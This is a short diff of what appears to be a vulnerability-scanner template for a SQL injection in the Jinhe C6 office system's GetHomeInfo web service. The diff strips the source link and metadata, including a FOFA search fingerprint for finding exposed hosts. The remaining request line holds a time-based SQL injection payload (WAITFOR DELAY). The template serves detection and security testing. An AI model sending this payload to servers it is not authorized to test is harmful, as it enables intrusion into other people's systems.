@@ -3,12 +3,8 @@ info:
   name: 金和C6 gethomeinfo sql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qka9g521df4t7asp'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qka9g521df4t7asp
-    fofa: body="JHSoft.Web.AddMenu"
 http:
 - raw:
   - 'GET /c6/jhsoft.mobileapp/AndroidSevices/HomeService.asmx/GetHomeInfo?userID=1''%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
